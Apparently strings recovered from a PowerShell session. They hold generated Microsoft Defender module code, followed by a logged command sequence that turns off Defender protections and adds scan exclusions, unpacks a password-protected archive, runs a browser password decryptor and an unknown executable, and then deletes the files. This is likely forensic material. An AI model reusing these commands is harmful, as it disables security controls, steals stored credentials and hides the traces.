[Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpWDOScan' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpRollback'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpRollback\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Engine},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Platform},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Engine')) {\r\n          [object]$__cmdletization_value = ${Engine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Engine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Platform')) {\r\n          [object]$__cmdletization_value = ${Platform}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platform'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpRollback.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpRollback' -Alias '*'\r\n        \r\n"
"function __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}"
"prompt"
"Set-MPPreference -DisableBehaviourMonitoring $true"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"Add-MpPreference -ExclusionPath 'C:\\Users\\tommyxiaomi\\Documents' -ExclusionExtension '.exe' -Force"
"prompt"
"Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath \"C:\\Users\\tommyxiaomi\\Documents\""
"prompt"
"prompt"
"&\"C:\\Program Files\\7-Zip\\7z.exe\" x -phoilamgi intel.zip"
"prompt"
"dir"
"prompt"
"./browser-pw-decrypt.exe"
"prompt"
"./browser-pw-decrypt.exe all"
"prompt"
"prompt"
"prompt"
"& \"./intel.exe\""
"prompt"
"prompt"
"dir"
"prompt"
"cd report"
"prompt"
"dir"
"prompt"
"cd .."
"prompt"
"dir"
"prompt"
"rm ./*.exe -force"
"prompt"
"dir"
"prompt"
"rm intel.zip -force"
"prompt"
"dir"
"prompt"
"exit"
